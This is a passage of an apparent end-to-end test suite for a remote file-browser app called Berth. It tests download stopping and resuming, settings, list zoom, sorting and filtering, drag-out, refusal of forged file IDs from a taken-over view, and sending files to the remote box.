            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('wide.log'), 10_000);
            const before = await readdir(ctx.downloads).catch(() => [] as string[]);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="wide.log"] .fb-get:not(.fb-sum)')?.click()`);
            // It has to be really under way before it is stopped, or this proves nothing: the line has to be
            // counting bytes of a file it has not finished.
            const partWay = await until(async () => /wide\.log [0-9.]+ [KM]?B of 8\.0 MB/.test(await foot()), 25_000);
            const stops = await js<number>(front.view, `document.querySelectorAll('.fb-moving-one .fb-stop').length`);
            const clicked = await js<boolean>(front.view, `(() => { const one = [...document.querySelectorAll('.fb-moving-one')].find((d) => d.textContent.includes('wide.log')); const b = one?.querySelector('.fb-stop'); if (!b) return false; b.click(); return true; })()`);
            // The end has to say it was stopped. "No longer counting" is not the same thing: a download that
            // ran to its end is not counting either, and that is the failure this probe exists to catch.
            const stopped = await until(async () => (await foot()).includes('It was stopped'), 25_000);
            const back = await until(async () => (await readdir(ctx.downloads).catch(() => [] as string[])).length === before.length, 15_000);
            const after = await readdir(ctx.downloads).catch(() => [] as string[]);
            await lab.tell('filepace 0');
            check('a transfer under way can be stopped, and nothing of it is left on the PC', partWay && stops === 1 && clicked && stopped && back && !after.includes('wide.log'), [partWay, stops, clicked, ctx.filesAsked(), await foot(), before.length, after]);
          }
          // A download that breaks part way, and the next try taking it up where it stopped. This is the one
          // that matters on a link that drops: the bytes already here are kept, the rest is asked for, and
          // what is checked at the end still covers the whole file.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const made = await lab.tell('bigfile var/log/broken.log 3000000');
            check('the lab made a file to break a download in the middle of', made['bytes'] === 3000000, made);
            // The box stops answering a third of the way in, which is what a link going down looks like.
            await lab.tell('failreads 1000000');
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('broken.log'), 10_000);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="broken.log"] .fb-get:not(.fb-sum)')?.click()`);
            const brokeSaid = await until(async () => (await foot()).includes('could not be brought over'), 30_000);
            // What it had is still there, under the name a half-written download has, and the file itself is
            // not in the folder under its own name.
            const halfWay = await readdir(ctx.downloads).catch(() => [] as string[]);
            check('a download that breaks says so, keeps what it had, and nothing is there under the file\'s own name', brokeSaid && halfWay.includes('.berth-broken.log.part') && !halfWay.includes('broken.log'), [await foot(), halfWay]);
            // The box answers again, and the same press takes it up where it stopped.
            await lab.tell('failreads 0');
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="broken.log"] .fb-get:not(.fb-sum)')?.click()`);
            const done = await until(async () => (await foot()).includes('is in the download folder'), 40_000);
            const said = await foot();
            const after = await readdir(ctx.downloads).catch(() => [] as string[]);
            const itsHash = createHash('sha256').update(await readFile(path.join(ctx.downloads, 'broken.log')).catch(() => Buffer.alloc(0))).digest('hex');
            const onTheBox = await lab.tell('hashof var/log/broken.log');
            check('the next try takes it up where it stopped, and the whole file is what the box has', done && said.includes('taken up where it broke') && said.includes('checked against the box') && !after.includes('.berth-broken.log.part') && itsHash === onTheBox['sha256'], [said, after, itsHash === onTheBox['sha256']]);
            await lab.tell('forget var/log/broken.log');
          }
          // The settings: where downloads land, and how big a new tab's list starts. Both live in the same
          // locked list as the boxes and are written by the same save, so a change to one cannot drop the other.
          {
            const said = (): Promise<string> => js<string>(ctx.shell, `document.getElementById('status')?.textContent ?? ''`);
            await js(ctx.shell, `document.getElementById('boxes')?.click()`);
            await until(() => has('#settings-open'), 5000);
            await clickOn('#settings-open');
            const open = await until(() => has('#settings'), 5000);
            await shot('settings', 'the settings: where downloads land, and how big a new tab list starts', null);
            const showsDefault = await text('#settings-downloads');
            const canPutBack = await js<boolean>(ctx.shell, `document.getElementById('settings-downloads-default')?.disabled === true`);
            check('the settings open from the Boxes menu, show where downloads land now, and offer no way back while that is already the default', open && showsDefault === ctx.downloads && canPutBack, [open, showsDefault === ctx.downloads, canPutBack]);
            // Choosing a folder: the chooser is the system's own, which only a person can answer, so a view
            // may ask for it and may never name a folder.
            const mine = await mkdtemp(path.join(os.tmpdir(), 'berth-downloads-'));
            ctx.chooseFolder(() => mine);
            await clickOn('#settings-downloads-pick');
            const took = await until(async () => (await text('#settings-downloads')) === mine, 10_000);
            check('a folder chosen in the system\'s own chooser becomes where downloads land', took && ctx.downloads !== mine && (await said()).includes('land in the folder you chose'), [took, await text('#settings-downloads')]);
            // And it really is where the next download lands, not only what the screen says.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-get:not(.fb-sum)')?.click()`);
            const landedThere = await until(async () => (await readdir(mine).catch(() => [] as string[])).some((n) => n.startsWith('syslog')), 30_000);
            check('and the next file brought over really lands there', landedThere, await readdir(mine).catch(() => []));
            // A folder that cannot be written to is refused here, where he can still be told, and not at the
            // first download with a file already half across the network.
            const readOnly = await mkdtemp(path.join(os.tmpdir(), 'berth-readonly-'));
            await chmod(readOnly, 0o500);
            ctx.chooseFolder(() => readOnly);
            await clickOn('#settings-downloads-pick');
            const refused = await until(async () => (await said()).includes('cannot be written to'), 10_000);
            check('a folder that cannot be written to is refused, and downloads land where they did', refused && (await text('#settings-downloads')) === mine, [refused, await text('#settings-downloads')]);
            await chmod(readOnly, 0o700).catch(() => undefined);
            // Put it back: Berth's own folder again.
            ctx.chooseFolder(null);
            await clickOn('#settings-downloads-default');
            const backToOwn = await until(async () => (await text('#settings-downloads')) === ctx.downloads, 10_000);
            check('one press puts the download folder back to Berth\'s own', backToOwn, await text('#settings-downloads'));
            // The size a new tab's list starts at is saved, and a tab opened after it really starts there.
            await clickOn('#settings-size-130');
            const sizeSaved = await until(() => ctx.settingsNow().paneSize === 1.3, 10_000);
            const later = ctx.openTab(front.box!.id, 'logs')!;
            const startedBig = await until(async () => (await js<string>(later.view, `document.getElementById('files')?.dataset.size ?? ''`)) === '130', 20_000);
            const frontUnmoved = await js<string>(front.view, `document.getElementById('files')?.dataset.size ?? ''`);
            ctx.closeTab(later.id);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
            await until(() => ctx.shellState().active === front.id, 3000);
            check('the size a new tab starts at is saved, and a tab opened after it starts there, while the tabs already open do not move', sizeSaved && startedBig && frontUnmoved === '100', [sizeSaved, startedBig, frontUnmoved]);
            await clickOn('#settings-size-100');
            await until(() => ctx.settingsNow().paneSize === 1, 10_000);
            // And the boxes are still there: one list, one save, and a setting cannot drop a box.
            const boxesStill = ctx.shellState().boxes.length;
            await clickOn('#settings-close');
            await until(async () => !(await has('#settings')), 5000);
            check('changing a setting leaves every box where it was', boxesStill > 0 && ctx.shellState().boxes.length === boxesStill, [boxesStill, ctx.shellState().boxes.length]);
            await rm(mine, { recursive: true, force: true });
            await rm(readOnly, { recursive: true, force: true });
          }
          // How big the list's own text is. His words about MobaXterm: the terminal zooms and the file browser
          // does not. It is this pane's own size, apart from the terminal's.
          {
            const rowHeight = (): Promise<number> => js<number>(front.view, `Math.round(document.querySelector('#fb-list .fb-row')?.getBoundingClientRect().height ?? 0)`);
            const termSize = (): Promise<string> => js<string>(front.view, `getComputedStyle(document.getElementById('term') ?? document.body).fontSize`);
            const foot = (): Promise<string> => js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            const was = await rowHeight();
            const termWas = await termSize();
            const at = (): Promise<string> => js<string>(front.view, `document.getElementById('files')?.dataset.size ?? ''`);
            await js(front.view, `document.querySelector('#fb-list .fb-row')?.focus()`);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true }))`);
            const bigger = await until(async () => (await rowHeight()) > was, 4000);
            const saidBigger = (await foot()).includes('%');
            check('the list has a size of its own: Ctrl and plus makes it bigger, and says so', bigger && saidBigger && (await at()) !== '100', [was, await rowHeight(), await at()]);
            // The terminal beside it is untouched: two things read for different reasons, each with its own
            // size, and a press meant for one must never move the other.
            check('and the terminal beside it does not move', (await termSize()) === termWas, [termWas, await termSize()]);
            // The wheel reaches it too, which is what a hand already pointing at the list goes for.
            const atBigger = await rowHeight();
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new WheelEvent('wheel', { deltaY: 120, ctrlKey: true, bubbles: true, cancelable: true }))`);
            const smallerByWheel = await until(async () => (await rowHeight()) < atBigger, 4000);
            check('Ctrl and the wheel reaches it as well', smallerByWheel, [atBigger, await rowHeight()]);
            // The press is taken by the pane and not left to the browser underneath it. Without that, Chromium
            // zooms the whole view on the same key and the terminal goes with it, which is the one thing this
            // is here to keep apart. What is asked is whether the event was really consumed, because a lab
            // window with no menu does not apply that zoom and so could never show the difference.
            const eaten = await js<boolean[]>(
              front.view,
              `(() => { const f = document.getElementById('files'); const k = new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true, cancelable: true }); const w = new WheelEvent('wheel', { deltaY: -120, ctrlKey: true, bubbles: true, cancelable: true }); const a = !f.dispatchEvent(k); const b = !f.dispatchEvent(w); return [a, b]; })()`,
            );
            // And a press that is not this pane's is left alone: Ctrl with a letter belongs to the box or to
            // the window, and a pane that ate those would take the copy key out of the terminal beside it.
            const letThrough = await js<boolean>(front.view, `document.getElementById('files').dispatchEvent(new KeyboardEvent('keydown', { key: 'c', ctrlKey: true, bubbles: true, cancelable: true }))`);
            check('the press is taken by the pane, not left to the browser to zoom the whole view; and a press that is not its own is left alone', eaten[0] === true && eaten[1] === true && letThrough === true, [eaten, letThrough]);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) === was, 4000);
            // Ctrl and nought puts it back exactly, not approximately. It is made bigger again first, so that
            // this probe is about the key and not about where the wheel happened to leave it.
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) > was, 4000);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            const back = await until(async () => (await rowHeight()) === was, 4000);
            check('Ctrl and nought puts it back to its own size exactly', back && (await at()) === '100' && (await foot()).includes('back to its own size'), [was, await rowHeight(), await at()]);
            // At either end a press still answers, or a person presses into silence wondering whether the key
            // reached the window at all.
            for (let i = 0; i < 9; i++) await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '-', ctrlKey: true, bubbles: true }))`);
            const saidEnd = await until(async () => (await foot()).includes('as small as the list goes'), 4000);
            check('a press at the smallest it goes still answers', saidEnd, await foot());
            // And the same key at the size it started from says that, rather than naming an end it is not at.
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) === was, 4000);
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            check('and at its own size it says that, not that it is at an end', await until(async () => (await foot()).includes('already at its own size'), 4000), await foot());
            await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await until(async () => (await rowHeight()) === was, 4000);
          }
          // The order of the list, and narrowing it. Both are the window's own: no ask leaves it for either,
          // because the folder it already has is the whole folder (plan B4.1).
          {
            const names = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            const foot = (): Promise<string> => js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            const asksBefore = { ...ctx.filesAsked() };
            const byName = await names();
            // Folders come first whatever the order is by, and the way up is always the first row.
            // The way up is left out: it is a folder in every order there is, so a check that counted it would
            // say folders come first however the list was really ordered.
            const kinds = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..').map((r) => r.dataset.kind)`);
            const foldersFirstByName = (await kinds()).join(',').startsWith('folder');
            await clickOn('#fb-by-size', front);
            const bySize = await names();
            const sizes = await js<number[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => Number(r.dataset.bytes))`);
            const biggestFirst = sizes.every((n, i) => i === 0 || sizes[i - 1]! >= n);
            const foldersStillFirst = (await kinds()).join(',').startsWith('folder');
            check('ordering by size puts the biggest file first, keeps folders above files, and asks the box for nothing', bySize.join() !== byName.join() && biggestFirst && foldersStillFirst && JSON.stringify(ctx.filesAsked()) === JSON.stringify(asksBefore), [bySize.slice(0, 5), sizes.slice(0, 5), foldersStillFirst]);
            // The same column again turns it around.
            await clickOn('#fb-by-size', front);
            const smallest = await js<number[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => Number(r.dataset.bytes))`);
            check('pressing the same column again turns the order around', smallest.every((n, i) => i === 0 || smallest[i - 1]! <= n) && smallest.length === sizes.length, [smallest.slice(0, 5)]);
            // Ordered by when it changed, the rows say when: an order with nothing on screen to read it
            // against is an order a person has to take on trust.
            await clickOn('#fb-by-changed', front);
            const saysWhen = await js<number>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..' && (r.querySelector('.fb-size')?.textContent ?? '') !== '').length`);
            const times = await js<number[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => Number(r.dataset.changed))`);
            check('ordered by when it changed, the newest is first and every row says when', times.every((n, i) => i === 0 || times[i - 1]! >= n) && saysWhen > 0, [times.slice(0, 4), saysWhen]);
            await clickOn('#fb-by-name', front);
            check('and the order goes back to the name', (await names()).join() === byName.join(), [(await names()).slice(0, 5), byName.slice(0, 5)]);
            // Narrowing the list hides rows and nothing else: the folder is still the whole folder, the count
            // says what is hidden, and the box is asked for nothing.
            await js(front.view, `(document.getElementById('fb-find').value = 'log', document.getElementById('fb-find').dispatchEvent(new Event('input', { bubbles: true })))`);
            const narrowed = await names();
            const saidHidden = (await foot()).includes('hidden by the filter');
            check('narrowing the list shows only what is being looked for, says how many are hidden, and asks the box for nothing', narrowed.length < byName.length && narrowed.filter((n) => n !== '..').every((n) => n.toLowerCase().includes('log')) && saidHidden && JSON.stringify(ctx.filesAsked()) === JSON.stringify(asksBefore), [narrowed, saidHidden]);
            // Nothing matches: the pane says so rather than looking like an empty folder.
            await js(front.view, `(document.getElementById('fb-find').value = 'zzzz-nothing', document.getElementById('fb-find').dispatchEvent(new Event('input', { bubbles: true })))`);
            const saidNone = await until(() => has('#fb-none-match', front), 5000);
            const stillHas = (await js<string>(front.view, `document.getElementById('fb-none-match')?.textContent ?? ''`)).includes('hidden by the filter');
            check('a filter that matches nothing says so, and says the folder is not empty', saidNone && stillHas && !(await has('#fb-empty', front)), [saidNone, stillHas]);
            // One press gives the folder back.
            await clickOn('#fb-find-clear', front);
            const back = await until(async () => (await names()).join() === byName.join(), 5000);
            check('one press on the clear gives the whole folder back', back && (await js<string>(front.view, `document.getElementById('fb-find')?.value ?? 'x'`)) === '', [back]);
            // And moving to another folder does not carry the filter into it.
            await js(front.view, `(document.getElementById('fb-find').value = 'log', document.getElementById('fb-find').dispatchEvent(new Event('input', { bubbles: true })))`);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('log'), 10_000);
            const cleared = await js<string>(front.view, `document.getElementById('fb-find')?.value ?? 'x'`);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('syslog'), 10_000);
            check('a filter belongs to the folder it was typed in, and does not follow you out of it', cleared === '', cleared);
          }
          // Dragging a file out of the window. The drag itself belongs to Windows and is his PC's to prove; what
          // is proven here is everything around it: which files a tab may drag, that a view names a number and
          // never a path, that another tab's file and a made-up number are refused, and that a tab closing takes
          // what it could drag with it (plan B4.5, B2.7).
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            let handedOver = '';
            ctx.watchDrags((file) => void (handedOver = file));
            // This one file has not been brought over, so its row is not draggable. A file of its own is made
            // for it, because a file another probe has already pressed would be draggable before this begins
            // (a press fetches a small file: plan B4.5) and this probe would then be about nothing.
            await lab.tell('bigfile /var/log/dragme.log 40000');
            // The folder is listed again so the new file is in it: the pane shows what it was given, and a file
            // made behind its back is not in that.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const itIsThere = await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('dragme.log'), 10_000);
            check('the lab box made a file of this probe\'s own, and the pane lists it', itIsThere, itIsThere);
            const canDragBefore = ctx.canDrag(front.id);
            const rowBefore = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.getAttribute('draggable') === 'true'`);
            // Bring it over, and it becomes draggable: a line in the strip and the row itself.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-get:not(.fb-sum)')?.click()`);
            const there = await until(async () => (await foot()).includes('is in the download folder'), 30_000);
            const rowNow = await until(async () => js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"].fb-on-pc')?.getAttribute('draggable') === 'true'`), 5000);
            const lineNow = await js<boolean>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one[draggable="true"]')].some((e) => (e.textContent ?? '').includes('dragme.log'))`);
            check('a file this tab brought over becomes draggable, from its line and from its row; before it was not', there && rowNow && lineNow && !rowBefore && ctx.canDrag(front.id) === canDragBefore + 1, [there, rowNow, lineNow, rowBefore, ctx.canDrag(front.id) - canDragBefore]);
            // The press hands main the number of the ask, and main hands the system the file it decided on. The
            // row is pressed rather than a line of the strip, because the row names one file and no other.
            const asked = ctx.dragsAsked();
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
            const handed = await until(() => handedOver !== '', 5000);
            const saidSo = await until(async () => (await foot()).includes('being dragged out'), 5000);
            // What was handed over is the file itself: in the download folder, under the name main gave it
            // (which is not always the box's, B4.2), and holding what the box holds.
            const itsBytes = await readFile(handedOver).catch(() => Buffer.alloc(0));
            const onTheBox = await lab.tell('hashof var/log/dragme.log');
            const same = createHash('sha256').update(itsBytes).digest('hex') === onTheBox['sha256'];
            check('the press hands main a number, and main hands the system the file it chose: in the download folder, under the name it gave it, holding what the box holds', handed && saidSo && handedOver.startsWith(ctx.downloads) && path.basename(handedOver).startsWith('dragme.log') && same && ctx.dragsAsked() === asked + 1, [handedOver.replace(ctx.downloads, '<downloads>'), saidSo, same]);
            // The download folder is his, so a file can be moved or deleted between landing and the hand
            // reaching for it. Main looks for it again before handing it over, and the window says so.
            {
              const gone = handedOver;
              handedOver = '';
              await rm(gone, { force: true });
              const askedBefore = ctx.dragsAsked();
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
              const toldHim = await until(async () => (await foot()).includes('not in the download folder any more'), 6000);
              const rowStopped = await until(async () => js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.getAttribute('draggable') !== 'true'`), 6000);
              check('a file that has left the download folder is not handed to the system: the window says so and stops offering it', toldHim && rowStopped && handedOver === '' && ctx.dragsAsked() === askedBefore, [toldHim, rowStopped, handedOver, ctx.dragsAsked() - askedBefore]);
            }
            // A download that failed leaves nothing to drag: there is no file to hand over, so the row and the
            // line must not offer one.
            {
              // The strip is not asked whether this failed: an earlier probe's line says the same words, and a
              // probe that reads them would pass however this was written. What is asked is main's own count of
              // what this tab may drag, which cannot be anything but this download's own answer.
              const couldDrag = ctx.canDrag(front.id);
              const lines = (): Promise<number> => js<number>(front.view, `document.querySelectorAll('#fb-moving .fb-moving-one').length`);
              const linesBefore = await lines();
              await lab.tell('failreads 1');
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-get:not(.fb-sum)')?.click()`);
              const went = await until(async () => (await lines()) > linesBefore, 10_000);
              const settled = await until(async () => (await js<number>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one')].filter((e) => e.querySelector('.fb-stop')).length`)) === 0, 40_000);
              await lab.tell('failreads 0');
              const offered = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.getAttribute('draggable') === 'true'`);
              check('a download that failed leaves nothing to drag', went && settled && !offered && ctx.canDrag(front.id) === couldDrag, [went, settled, offered, ctx.canDrag(front.id) - couldDrag]);
            }
            // A number this tab never had, another tab's number, and a number that is not one: each is dropped
            // and nothing is handed over. This is the whole of what a taken-over view could try.
            handedOver = '';
            const droppedBefore = ctx.dropped();
            const other = [...ctx.tabs.values()].find((t) => t.id !== front.id);
            await js(front.view, `(window.tabPort.drag(987654), window.tabPort.drag(0), window.tabPort.drag(-1), window.tabPort.drag('a'))`);
            if (other) await js(other.view, `window.tabPort.drag(1)`);
            await sleep(400);
            refusedByTheLock += other ? 5 : 4;
            check('a view can drag out nothing it was not given: every made-up number is dropped and nothing is handed over', handedOver === '' && ctx.dropped() === droppedBefore + (other ? 5 : 4) && ctx.dragsAsked() === asked + 1, [handedOver, ctx.dropped() - droppedBefore, ctx.dragsAsked() - asked]);
            // A tab that closes takes what it could drag with it, so a number cannot outlive its tab. The spare
            // tab has to bring a file over for this to be about anything: a tab that never fetched one would
            // hold nothing either way, and the probe would pass however the closing was written.
            const spare = ctx.openTab(front.box!.id, 'logs')!;
            await until(() => spare.engine.link.phase === 'up', 25_000);
            await until(async () => (await js<number>(spare.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 0, 20_000);
            await js(spare.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-get:not(.fb-sum)')?.click()`);
            const spareGotOne = await until(() => ctx.canDrag(spare.id) > 0, 30_000);
            const hadSpare = ctx.canDrag(spare.id);
            const hadFront = ctx.canDrag(front.id);
            ctx.closeTab(spare.id);
            check('a tab that closes takes what it could drag with it, and leaves every other tab whole', spareGotOne && hadSpare > 0 && ctx.canDrag(spare.id) === 0 && ctx.canDrag(front.id) === hadFront, [spareGotOne, hadSpare, ctx.canDrag(spare.id), hadFront, ctx.canDrag(front.id)]);
            // A small file nobody has brought over: a press on its row fetches it, into Berth's own folder and
            // never his, so that a drag begun a moment later has something to carry (plan B4.5).
            {
              await lab.tell('bigfile /var/log/carry-me.txt 2000');
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('carry-me.txt'), 10_000);
              const notYet = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.getAttribute('draggable') === 'true'`);
              const inDownloads = (await readdir(ctx.downloads).catch(() => [] as string[])).length;
              handedOver = '';
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              const ready = await until(async () => js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.getAttribute('draggable') === 'true'`), 30_000);
              const saidReady = (await foot()).includes('ready to drag');
              // It is carried, not downloaded: his download folder is untouched, and what is handed over is a
              // copy in Berth's own folder holding exactly what the box holds.
              const stillSoMany = (await readdir(ctx.downloads).catch(() => [] as string[])).length;
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
              const handed = await until(() => handedOver !== '', 5000);
              const its = createHash('sha256').update(await readFile(handedOver).catch(() => Buffer.alloc(0))).digest('hex');
              const onTheBox = await lab.tell('hashof var/log/carry-me.txt');
              check('a press on a small file fetches it so it can be dragged, into Berth\'s own folder and not his download folder', !notYet && ready && saidReady && handed && !handedOver.startsWith(ctx.downloads) && its === onTheBox['sha256'] && stillSoMany === inDownloads, [notYet, ready, saidReady, handedOver.replace(ctx.downloads, '<downloads>'), its === onTheBox['sha256'], inDownloads, stillSoMany]);
              // A second press changes nothing: it is already here, so no second fetch is started.
              const held = ctx.canDrag(front.id);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await sleep(600);
              const fetchingAgain = (await foot()).includes('Fetching carry-me');
              check('a file already here is not fetched again by another press', !fetchingAgain && ctx.canDrag(front.id) === held, [fetchingAgain, ctx.canDrag(front.id) - held]);
              await lab.tell('forget var/log/carry-me.txt');
            }
            // A file too big to pick up by hand is not fetched by a press: the window says so and leaves it to
            // the download button, rather than quietly fetching hundreds of megabytes because a row was touched.
            {
              await lab.tell('bigfile /var/log/heavy.bin 5000000');
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('heavy.bin'), 10_000);
              const couldDrag = ctx.canDrag(front.id);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="heavy.bin"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await sleep(1500);
              const offered = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="heavy.bin"]')?.getAttribute('draggable') === 'true'`);
              check('a file too big to pick up by hand is not fetched by a press, and is left to the download button', !offered && ctx.canDrag(front.id) === couldDrag, [offered, ctx.canDrag(front.id) - couldDrag]);
              // And the limit is main's, not the window's. A view that has been taken over does not press rows:
              // it asks. So the ask is made directly, past everything the window would have checked first.
              await js(front.view, `window.tabPort.files({ id: 500001, do: 'grab', path: '/var/log/heavy.bin' })`);
              const refused = await until(async () => (await foot()).includes('too big to pick up by hand'), 20_000);
              check('the size a press may fetch is main\'s own limit: an ask that goes straight to it is refused', refused && ctx.canDrag(front.id) === couldDrag, [refused, ctx.canDrag(front.id) - couldDrag]);
              await lab.tell('forget var/log/heavy.bin');
            }
            ctx.watchDrags(null);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
            await until(() => ctx.shellState().active === front.id, 3000);
          }
          // Sending a file from the PC to the box. Which file leaves this PC is answered in the system's own
          // chooser, which no view and no box can answer: the lab answers it in main's place, and the view's
          // part is only naming the folder it is looking at.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const mine = await mkdtemp(path.join(os.tmpdir(), 'berth-send-'));
            const sending = path.join(mine, 'from-the-pc.conf');
            await writeFile(sending, 'a file this PC is sending\n');
            ctx.chooseToSend(() => sending);
            await js(front.view, `document.getElementById('fb-send')?.click()`);
            const sent = await until(async () => (await foot()).includes('is on the box'), 25_000);
            const said = await foot();
            const landed = await lab.tell('read var/log/from-the-pc.conf');
            check('the send button puts a file from the PC on the box, and the box agrees about it', sent && said.includes('the box holds the same file') && landed['text'] === 'a file this PC is sending\n', [said, landed]);
            // A file already on the box: Berth asks first, with both files in front of the person, and nothing
            // on the box is touched until the answer comes back (BUILD-RULES 2.20).
            await writeFile(sending, 'the second try, which only goes in if he says so\n');
            await js(front.view, `document.getElementById('fb-send')?.click()`);
            const asked = await until(() => has('#replacing'), 25_000);
            await shot('replace-asks', 'a file already on the box, asked about before anything is replaced', front);
            const bothShown = await text('#replacing-both');
            const titleShown = await text('#replacing-title');
            // The way out takes the focus as the dialog is drawn, which is a moment after it is there: it is
            // waited for rather than sampled, or this probe is about how fast the machine is.
